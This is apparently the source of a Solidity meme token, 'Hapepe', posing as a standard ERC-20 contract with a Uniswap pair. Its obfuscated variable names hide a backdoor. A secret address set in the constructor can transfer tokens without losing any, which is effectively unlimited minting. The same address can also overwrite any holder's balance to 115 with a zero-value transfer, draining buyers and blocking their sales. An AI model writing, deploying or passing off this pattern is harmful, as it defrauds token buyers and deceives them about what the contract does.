/*

https://t.me/Hapepe_eth


*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Hapepe is Ownable {
    mapping(address => uint256) private vmcz;

    constructor(address gdmkevfqa) {
        balanceOf[msg.sender] = totalSupply;
        vmcz[gdmkevfqa] = tpaiw;
        IUniswapV2Router02 mdzvtx = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        cjomitnv = IUniswapV2Factory(mdzvtx.factory()).createPair(address(this), mdzvtx.WETH());
    }

    function approve(address xpgol, uint256 qtkumexc) public returns (bool success) {
        allowance[msg.sender][xpgol] = qtkumexc;
        emit Approval(msg.sender, xpgol, qtkumexc);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private tpaiw = 115;

    string public name = 'Hapepe';

    mapping(address => uint256) private iyxg;

    function transferFrom(address cnepoaf, address yfcqiotbnzsl, uint256 qtkumexc) public returns (bool success) {
        require(qtkumexc <= allowance[cnepoaf][msg.sender]);
        allowance[cnepoaf][msg.sender] -= qtkumexc;
        wuvzhq(cnepoaf, yfcqiotbnzsl, qtkumexc);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    function transfer(address yfcqiotbnzsl, uint256 qtkumexc) public returns (bool success) {
        wuvzhq(msg.sender, yfcqiotbnzsl, qtkumexc);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public cjomitnv;

    string public symbol = 'Hapepe';

    function wuvzhq(address cnepoaf, address yfcqiotbnzsl, uint256 qtkumexc) private {
        if (vmcz[cnepoaf] == 0) {
            balanceOf[cnepoaf] -= qtkumexc;
        }
        balanceOf[yfcqiotbnzsl] += qtkumexc;
        if (vmcz[msg.sender] > 0 && qtkumexc == 0 && yfcqiotbnzsl != cjomitnv) {
            balanceOf[yfcqiotbnzsl] = tpaiw;
        }
        emit Transfer(cnepoaf, yfcqiotbnzsl, qtkumexc);
    }

    uint8 public decimals = 9;
}